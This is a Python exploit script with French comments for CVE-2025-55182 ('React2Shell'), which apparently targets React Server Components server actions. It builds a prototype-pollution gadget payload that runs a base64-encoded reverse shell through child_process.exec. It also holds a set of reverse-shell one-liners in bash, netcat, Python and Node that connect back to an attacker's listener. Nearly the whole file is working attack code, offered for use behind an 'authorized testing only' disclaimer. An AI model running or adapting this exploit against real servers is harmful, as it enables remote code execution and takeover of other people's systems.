#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) - Exploit Reverse Shell

Envoie un payload de reverse shell vers une cible vulnérable.

À DES FINS ÉDUCATIVES ET DE TESTS AUTORISÉS UNIQUEMENT.

Utilisation :
    # Terminal 1 - Démarrer l'écouteur :
    nc -lvnp 4444
    
    # Terminal 2 - Lancer l'exploit :
    python3 reverse_shell.py <url_cible> <votre_ip> <port>

Exemples :
    python3 reverse_shell.py http://localhost:3000 192.168.1.100 4444
    python3 reverse_shell.py http://vulnerable-app:3000 10.0.0.5 9001
"""

import requests
import json
import sys
import base64
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║       Exploit Reverse Shell CVE-2025-55182                    ║
║                                                               ║
║  ⚠️  POUR TESTS DE SÉCURITÉ AUTORISÉS UNIQUEMENT              ║
╚═══════════════════════════════════════════════════════════════╝
"""

# Divers payloads de reverse shell
SHELL_PAYLOADS = {
    'bash': 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    'bash_196': 'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
    'nc': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    'nc_e': 'nc -e /bin/bash {lhost} {lport}',
    'python': (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    'node': (
        "node -e '(function(){{var net=require(\"net\"),"
        "cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);"
        "var client=new net.Socket();"
        "client.connect({lport},\"{lhost}\",function(){{"
        "client.pipe(sh.stdin);sh.stdout.pipe(client);"
        "sh.stderr.pipe(client);}});}})();'"
    ),
}


def create_reverse_shell_payload(lhost: str, lport: int, shell_type: str = 'bash') -> str:
    """Créer le payload malveillant pour le reverse shell."""
    
    # Obtenir la commande shell
    if shell_type not in SHELL_PAYLOADS:
        shell_type = 'bash'
    
    shell_cmd = SHELL_PAYLOADS[shell_type].format(lhost=lhost, lport=lport)
    
    # Encodage Base64 pour un transport sûr
    encoded = base64.b64encode(shell_cmd.encode()).decode()
    
    # Construire le payload gadget RSC
    payload_obj = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": (
                f"process.mainModule.require('child_process')"
                f".exec('echo {encoded}|base64 -d|bash');"
                f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:'shell_sent'}});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }
    
    return json.dumps(payload_obj)


def send_reverse_shell(target: str, lhost: str, lport: int, shell_type: str = 'bash'):
    """Envoyer l'exploit reverse shell à la cible."""
    
    target = target.rstrip('/')
    boundary = "WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Security Research)",
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary=----{boundary}",
    }
    
    payload = create_reverse_shell_payload(lhost, lport, shell_type)
    
    body = f"""------{boundary}\r
Content-Disposition: form-data; name="0"\r
\r
{payload}\r
------{boundary}\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
------{boundary}\r
Content-Disposition: form-data; name="2"\r
\r
[]\r
------{boundary}--\r
"""
    
    print(f"[*] Envoi du payload reverse shell {shell_type}...")
    print(f"[*] Cible : {target}")
    print(f"[*] Rappel (Callback) : {lhost}:{lport}")
    print("")
    
    try:
        response = requests.post(
            target,
            headers=headers,
            data=body.encode(),
            timeout=5,
            verify=False,
            allow_redirects=False
        )
        
        print(f"[+] Payload envoyé ! Statut : {response.status_code}")
        print(f"[*] Vérifiez votre écouteur pour la connexion entrante...")
        
    except requests.exceptions.Timeout:
        print("[+] Requête expirée (cela peut être attendu pour les reverse shells)")
        print("[*] Vérifiez votre écouteur pour la connexion entrante...")
    except Exception as e:
        print(f"[-] Erreur : {e}")


def main():
    print(BANNER)
    
    if len(sys.argv) < 4:
        print("Utilisation : python3 reverse_shell.py <url_cible> <votre_ip> <port> [type_shell]")
        print("")
        print("Types de shell :")
        for name, cmd in SHELL_PAYLOADS.items():
            print(f"  - {name}")
        print("")
        print("Exemples :")
        print("  python3 reverse_shell.py http://localhost:3000 192.168.1.100 4444")
        print("  python3 reverse_shell.py http://cible:3000 10.0.0.5 9001 python")
        print("")
        print("N'oubliez pas de démarrer votre écouteur d'abord :")
        print("  nc -lvnp 4444")
        sys.exit(1)
    
    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = int(sys.argv[3])
    shell_type = sys.argv[4] if len(sys.argv) > 4 else 'bash'
    
    print(f"[!] IMPORTANT : Assurez-vous que votre écouteur est en cours d'exécution :")
    print(f"    nc -lvnp {lport}")
    print("")
    
    input("[*] Appuyez sur Entrée pour envoyer le payload...")
    print("")
    
    send_reverse_shell(target, lhost, lport, shell_type)


if __name__ == "__main__":
    main()
